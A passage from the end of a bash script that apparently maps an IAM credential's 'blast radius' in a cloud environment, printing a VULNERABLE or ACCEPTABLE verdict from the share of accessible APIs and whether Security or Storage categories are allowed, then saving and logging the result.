        print_vulnerable "VERDICT: VULNERABLE — Critical category access confirmed (Security or Storage ALLOWED)"
        result_text+=$'\n'"VERDICT: VULNERABLE — Critical category access confirmed (Security or Storage)"$'\n'
    else
        print_blocked "VERDICT: ACCEPTABLE — Blast radius ${blast_radius_pct}% is below threshold and no critical categories exposed"
        result_text+=$'\n'"VERDICT: ACCEPTABLE — Blast radius ${blast_radius_pct}% below threshold"$'\n'
    fi
fi

echo ""

save_result "${RESULT_FILE}" "${result_text}"

log "IAM blast radius mapping complete — ${ALLOWED_COUNT}/${TOTAL_COUNT} APIs accessible (${blast_radius_pct}%)"
